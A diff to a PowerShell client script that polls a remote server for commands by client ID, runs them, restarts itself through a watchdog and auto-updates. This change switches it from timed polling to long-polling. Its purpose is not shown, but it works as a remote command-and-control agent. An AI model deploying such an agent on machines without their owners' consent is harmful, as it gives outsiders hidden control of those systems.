@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.8"
+$Version = "3.1.0"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -252,7 +252,9 @@ function Send-Http {
 }
 
 function Get-Command-From-Server {
-    try { return (Send-Http -Url "$cfHost/cmd?id=$clientId").Trim() } catch { throw $_ }
+    # Long-poll: server holds the connection up to 30s waiting for a command.
+    # Use 35s timeout on our end to give the server room to respond cleanly.
+    try { return (Send-Http -Url "$cfHost/cmd?id=$clientId" -TimeoutMs 35000).Trim() } catch { throw $_ }
 }
 
 function Get-Signal-From-Server {
@@ -921,16 +923,13 @@ function Invoke-CommandStreaming {
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  MAIN LOOP                                                                ║
-# ║  Polls the server for commands, executes them, and reconnects on failure. ║
-# ║  Adaptive polling: 1s → 3s → 5s when idle. Exponential backoff on error. ║
-# ║  Self-kill after 5 min continuous failure so watchdog can restart fresh.   ║
+# ║  Long-polls the server for commands (/cmd holds ~30s until one arrives).  ║
+# ║  Zero idle CPU/network — server does the waiting, not the client.         ║
+# ║  Exponential backoff on error. Self-kill after 5 min continuous failure.  ║
 # ║  Do NOT remove — this is the entry point.                                 ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 function Connect-Cloudflare {
     $activeDelay   = 300
-    $idleStep1     = 1000
-    $idleStep2     = 3000
-    $idleStep3     = 5000
     $consecutiveIdle = 0
     $failingSince  = $null    # timestamp of first consecutive failure
     $selfKillMins  = 5        # kill self after this many minutes of non-stop failure
@@ -1117,10 +1116,8 @@ function Connect-Cloudflare {
             }
             else {
                 $consecutiveIdle++
-                $delay = if ($consecutiveIdle -le 10) { $idleStep1 }
-                         elseif ($consecutiveIdle -le 50) { $idleStep2 }
-                         else { $idleStep3 }
-                Start-Sleep -Milliseconds $delay
+                # No sleep needed — /cmd long-polls on the server for 30s.
+                # The server only returns when a command is ready or the hold expires.
 
                 # --- AUTO-UPDATE CHECK (removable) ---
                 $minsSinceCheck = ((Get-Date) - $script:lastUpdateCheck).TotalMinutes
